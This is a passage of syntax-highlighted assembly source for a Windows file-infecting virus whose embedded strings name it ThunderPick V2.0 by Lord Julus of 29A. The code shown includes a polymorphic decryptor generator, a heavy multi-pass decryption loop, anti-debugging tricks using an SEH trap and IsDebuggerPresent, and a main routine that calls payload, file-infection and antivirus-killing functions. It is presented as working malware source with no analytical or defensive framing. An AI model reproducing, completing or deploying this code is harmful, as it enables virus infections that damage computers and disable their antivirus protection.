       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@100</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;нstore code offset</span><span class="sc0">
</span><span class="sc5">@500</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@101</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;нstore key</span><span class="sc0">
</span><span class="sc5">@102</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;нstore length</span><span class="sc0">
</span><span class="sc5">@103</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;нget a dword</span><span class="sc0">
</span><span class="sc5">@104</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;нdecrypt with value</span><span class="sc0">
</span><span class="sc5">@105</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;нdecrypt with key</span><span class="sc0">
</span><span class="sc5">@106</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;нmodify key</span><span class="sc0">
</span><span class="sc5">@107</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">;нstore dword</span><span class="sc0">
</span><span class="sc5">@108</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;нincrease pointer</span><span class="sc0">
</span><span class="sc5">@109</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;нdecrease length</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@10A</span><span class="sc0">                     </span><span class="sc1">;нuntil the end</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@10A</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">polykey</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">value</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">keymodif</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc9">length</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">address1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">address2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">save</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">finito</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">regs</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">creg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;н code</span><span class="sc0">
</span><span class="sc5">lreg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">;н length of code</span><span class="sc0">
</span><span class="sc5">kreg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">;н encryption key</span><span class="sc0">
</span><span class="sc5">preg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                     </span><span class="sc1">;н pointer in code</span><span class="sc0">
</span><span class="sc5">jreg2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                     </span><span class="sc1">;н Junk register #1</span><span class="sc0">
</span><span class="sc5">jreg3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                     </span><span class="sc1">;н Junk register #2</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">op1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">unop1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">op2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11110000b</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11101000b</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">unop2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11110000b</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11101000b</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">index1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">index2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">index3</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">instr_len</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">@101</span><span class="sc4">-</span><span class="sc5">@100</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@102</span><span class="sc4">-</span><span class="sc5">@101</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@103</span><span class="sc4">-</span><span class="sc5">@102</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">@104</span><span class="sc4">-</span><span class="sc5">@103</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@105</span><span class="sc4">-</span><span class="sc5">@104</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@106</span><span class="sc4">-</span><span class="sc5">@105</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">@107</span><span class="sc4">-</span><span class="sc5">@106</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@108</span><span class="sc4">-</span><span class="sc5">@107</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@109</span><span class="sc4">-</span><span class="sc5">@108</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">@10A</span><span class="sc4">-</span><span class="sc5">@109</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">virusrun</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">                   </span><span class="sc1">;нget delta handle</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">getdelta</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@13</span><span class="sc0">                    </span><span class="sc1">;нnow obtain the imagebase</span><span class="sc0">
</span><span class="sc5">@13</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;нwhere the host loaded</span><span class="sc0">
</span><span class="sc5">@12</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001000h</span><span class="sc4">+(</span><span class="sc5">@12</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;нand save it...</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">imagebase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">              </span><span class="sc1">;нdefault imagebase</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">done</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">first_gen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;нdon't decrypt for</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">decrypt_level_2</span><span class="sc0">              </span><span class="sc1">;нgen. 1</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">decrypt_iteration</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'DEAD'</span><span class="sc4">+</span><span class="sc12">'MEAT'</span><span class="sc0">              </span><span class="sc1">;нinitialize decryptor</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decrypt_level_2</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">end</span><span class="sc4">-</span><span class="sc5">decrypt_level_2</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">decrypt_routine</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">;нdo decryption.</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                 </span><span class="sc1">;нThis decryptor loops</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'LORD'</span><span class="sc4">+</span><span class="sc12">'JULU'</span><span class="sc4">+</span><span class="sc12">'S'</span><span class="sc0">          </span><span class="sc1">;нabout 310.000 times</span><span class="sc0">
       </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                 </span><span class="sc1">;нand executes thou</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'THUN'</span><span class="sc4">+</span><span class="sc12">'DERP'</span><span class="sc4">+</span><span class="sc12">'ICK'</span><span class="sc0">        </span><span class="sc1">;нaround 4.650.000</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;нinstructions.</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'KICK'</span><span class="sc4">+</span><span class="sc12">'ASS!'</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">decrypt_routine</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypt_iteration</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">;нsave delta for later</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">decrypt_level_2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                    </span><span class="sc1">;нif debug is off we</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                    </span><span class="sc1">;нalso need to restore</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">               </span><span class="sc1">;нthis...</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindNeededStuff</span><span class="sc0">             </span><span class="sc1">;нget module bases and</span><span class="sc0">
</span><span class="sc5">first_gen</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;нapi addresses.</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" ThunderPick V2.0 Release November 1999 "</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" by Lord Julus / [29A]          "</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">FinishedLocatingStuff</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;нif successful...</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">Anti_Debugging</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                    </span><span class="sc1">;нif this is the release</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                    </span><span class="sc1">;нversion, we must do the</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DebuggerKill</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;нantidebugging stuffs.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;нHere we set up a new</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;нseh frame and then we</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нmake an exception error</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">               </span><span class="sc1">;нoccur.</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нTD stops here if in</span><span class="sc0">
                           </span><span class="sc1">;нdefault mode.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;нif instruction is not</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Anti_Debugging</span><span class="sc0">              </span><span class="sc1">;нexecuted the system will</span><span class="sc0">
                           </span><span class="sc1">;нhalt...</span><span class="sc0">
</span><span class="sc5">DebuggerKill</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;нthe execution goes here</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BDh</span><span class="sc0">                     </span><span class="sc1">;нdelta gets lost so we</span><span class="sc0">
</span><span class="sc5">delta2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;нmust restore it...</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@6</span><span class="sc0">                     </span><span class="sc1">;нhere we try to retrieve</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'IsDebuggerPresent'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;нIsDebuggerPresent API</span><span class="sc0">
</span><span class="sc5">@6</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;нif we fail it means we</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetProcAddress</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нdon't have this api</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;н(Windows95)</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">continue_process</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;нLet's check if our</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;нprocess is being</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">shut_down</span><span class="sc0">                   </span><span class="sc1">;нdebugged.</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue_process</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">shut_down</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;нIf so, close down!!</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitProcess</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нclose</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">continue_process</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">first_gen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;нa little trick to</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ok_</span><span class="sc0">                     </span><span class="sc1">;нensure the right run</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gen1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;нof the first gen.</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok__</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">ok_</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gen1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">ok__</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Randomize</span><span class="sc0">                  </span><span class="sc1">;нinitialize random gen.</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Decrypt</span><span class="sc0">                </span><span class="sc1">;нdecrypt stuff</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Payload</span><span class="sc0">                </span><span class="sc1">;нtry the payload</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">                 </span><span class="sc1">;нinfect files</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KillAV</span><span class="sc0">                 </span><span class="sc1">;нkill av files</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                </span><span class="sc1">;нand return to host</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">Decrypt</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
